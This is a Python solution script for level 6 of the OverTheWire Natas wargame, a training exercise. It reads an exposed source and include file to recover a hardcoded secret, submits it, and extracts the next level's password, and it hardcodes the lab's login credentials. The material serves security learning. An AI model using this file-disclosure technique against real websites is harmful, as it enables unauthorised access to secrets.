import requests
import  re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password))
# content = response.text
# print(content) #revealed a index-source.html view source page.

# response = session.get(url + "index-source.html", auth = (username, password))
# content = response.text
# print(content) #revealed includes/secret.inc

# response = session.get(url + "includes/secret.inc", auth = (username, password))
# content = response.text
# print(content) #revealed $secret = "FOEIUWGHFEEUHOFUOIU";

response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}, auth = (username, password))
content = response.text
# print(content)
print(re.findall('for natas7 is (.*)', content)[0])
